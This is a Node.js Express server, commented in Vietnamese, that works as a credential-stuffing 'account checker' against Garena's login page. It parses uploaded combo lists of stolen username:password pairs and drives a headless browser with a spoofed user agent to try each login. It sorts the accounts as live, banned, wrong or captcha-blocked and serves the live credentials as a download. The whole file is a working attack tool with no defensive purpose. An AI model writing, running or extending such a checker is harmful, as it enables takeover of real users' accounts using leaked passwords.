const express = require('express');
const multer = require('multer');
const puppeteer = require('puppeteer');
const fs = require('fs');
const path = require('path');
const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// Tạo thư mục 'temp' nếu chưa có để lưu file acc sống
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
app.use('/temp', express.static(tempDir));

async function checkLive(user, pass) {
    let browser;
    try {
        browser = await puppeteer.launch({
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
        });
        const page = await browser.newPage();
        // Thiết lập User-Agent để giống người dùng thật hơn
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36');
        
        await page.goto('https://sso.garena.com/ui/login?app_id=10100', { waitUntil: 'networkidle2', timeout: 30000 });
        
        await page.type('input[placeholder="Username/Email/Phone"]', user, { delay: 50 });
        await page.type('input[placeholder="Password"]', pass, { delay: 50 });
        await page.click('#confirm_btn');

        await new Promise(r => setTimeout(r, 3000)); 

        const content = await page.content();
        if (content.includes('Tài khoản của bạn đã bị khóa') || content.includes('account_banned')) return "BANNED";
        if (content.includes('Tên đăng nhập hoặc mật khẩu không đúng')) return "WRONG";
        if (content.includes('security_check') || content.includes('captcha')) return "CAPTCHA"; // Bị vướng captcha
        
        return "LIVE";
    } catch (e) {
        return "ERROR";
    } finally {
        if (browser) await browser.close();
    }
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/scan', upload.single('file'), async (req, res) => {
    if (!req.file) return res.status(400).send('Không có file.');
    
    const content = req.file.buffer.toString('utf8');
    const regex = /result = (.*?):(.*?)\s\|/g;
    let match, liveList = "", results = [];

    while ((match = regex.exec(content)) !== null) {
        const u = match[1].trim(), p = match[2].trim();
        const status = await checkLive(u, p);
        
        if (status === "LIVE") {
            liveList += `${u}:${p}\n`;
            results.push({ acc: `${u}:${p}`, st: "SỐNG ✅" });
        } else {
            results.push({ acc: `${u}:${p}`, st: status === "BANNED" ? "BAN ❌" : "LỖI/SAI ⚠️" });
        }
    }

    const fileName = `live_${Date.now()}.txt`;
    const filePath = path.join(tempDir, fileName);
    fs.writeFileSync(filePath, liveList);

    res.json({ data: results, download: `/temp/${fileName}` });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
